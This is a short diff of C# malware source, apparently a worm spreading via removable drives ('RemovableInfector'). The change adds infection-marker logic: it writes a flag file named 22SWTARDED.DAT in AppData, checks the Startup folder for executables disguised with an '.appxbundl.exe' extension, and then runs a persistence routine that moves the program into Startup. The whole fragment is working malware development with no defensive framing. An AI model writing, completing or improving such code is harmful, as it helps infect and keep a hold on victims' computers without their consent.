@@ -276,7 +276,19 @@ namespace zort
             // Continue infecting the system if not already infected
             if(!IsSystemInfected())
             {
-                PersistenceHelper.MoveAndRunFromStartup();
+                // Create a file indicating that we already copied to startup
+                string attribPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "22SWTARDED.DAT");
+                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                string[] startupFiles = Directory.GetFiles(startupPath, "*.appxbundl.exe");
+                if (!File.Exists(attribPath) && startupFiles.Length > 0)
+                {
+                    PersistenceHelper.MoveAndRunFromStartup();
+                    File.WriteAllBytes(attribPath, new byte[] { 0x01 });
+                } else
+                {
+                    ModuleLogger.Log(typeof(RemovableInfector), "Already moved to startup. Exiting.");
+                    Environment.Exit(0);
+                }
             } else
             {
                 ModuleLogger.Log(typeof(RemovableInfector), "System is already infected. Exiting.");
